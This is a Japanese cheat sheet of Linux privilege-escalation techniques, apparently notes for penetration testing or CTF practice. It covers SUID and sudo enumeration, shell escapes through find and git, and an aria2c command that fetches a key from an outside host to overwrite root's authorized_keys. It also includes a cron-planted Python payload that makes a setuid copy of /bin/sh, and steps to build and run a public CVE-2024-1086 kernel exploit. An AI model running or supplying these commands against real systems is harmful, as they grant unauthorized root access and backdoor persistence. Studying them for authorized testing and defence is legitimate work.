## 権限エスカレーションの調査

### 今のユーザーで実行可能な`sudo`権限の一覧
```bash
sudo -l
```

### 誰でも書き込み可能なファイルの調査
```bash
find / -perm -o+w -type f 2>/dev/null | grep /proc -v
```

### `setuid`ビットがセットされたファイルの調査
```bash
find / -type f -perm -4000 2>/dev/null
```
- `setuid`ビット: 実行時に所有者の権限で実行されるファイル

### 書き込み可能なディレクトリの調査
```bash
find / -writable -type d 2>/dev/null
```

### 任意のコマンドを用いて調査
```bash
find * -exec bash -p \;
```

### Debianシステムでインストールされているアプリケーション一覧
```bash
dpkg -l
```

### `sudo`を使ったGitの設定ヘルプの表示
```bash
sudo git -p help config
```
- シェルに入るための省略コマンド: `!/bin/sh`

### `aria2c`コマンドを使用したファイルの上書き
```bash
aria2c -d /root/.ssh/ -o authorized_keys "http://192.168.0.99:8000/id_rsa.pub" --allow-overwrite=true
```

### マウントされたドライブの一覧
```bash
cat /etc/fstab
```

### すべての利用可能なドライブの一覧
```bash
lsblk
```

### 読み込まれているドライバの一覧
```bash
lsmod
```

## 参考サイト
- [GTFObins - 各種ファイル等を利用した権限昇格サイト](https://gtfobins.github.io/)
```
## Cron Job
### Pythonで書かれているファイルに付与する例

以下のPythonコードを実行した後、`./sh`を実行します。

```python
#!/usr/bin/env python
import os
import sys
try:
        os.system('cp /bin/sh /tmp/sh ')
        os.system('chmod u+s /tmp/sh ')
except:
        sys.exit()
```

このコードは、`/bin/sh`を`/tmp/sh`にコピーし、`setuid`ビットを設定することで、`/tmp/sh`を実行するときに所有者の権限で実行されるようにします。

---

## Cronジョブの検出

Cronジョブを確認するために、以下のコマンドを使用します。

#### `/etc/crontab`ファイルの内容を表示
```bash
cat /etc/crontab
```

#### 現在のユーザーのCronジョブを表示
```bash
crontab -l
```

#### pspyツールの利用
`pspy`は、Linux上でリアルタイムに発生しているアクティビティを監視するための便利なツールです。

---
## 既知の脆弱性を利用する
#### CVE-2024-1086
CVE-2024-1086に関する詳細情報は以下のリンクから確認できます。
##### 脆弱性の概要
[CVE-2024-1086](https://www.cve.org/CVERecord?id=CVE-2024-1086)

---

##### musl-gccのインストール

以下の手順で`musl-gcc`をインストールします。`musl-gcc`は、Musl libc向けのGCCコンパイラです。

```bash
sudo apt update
sudo apt install musl-tools
```

---

##### PoCのインストール

次に、CVE-2024-1086のPoC（概念実証）をインストールします。

```bash
git clone https://github.com/Notselwyn/CVE-2024-1086
cd CVE-2024-1086
make
```

---

##### PoCの実行

インストール後、以下のコマンドでPoCを実行します。

```bash
./exploit
```

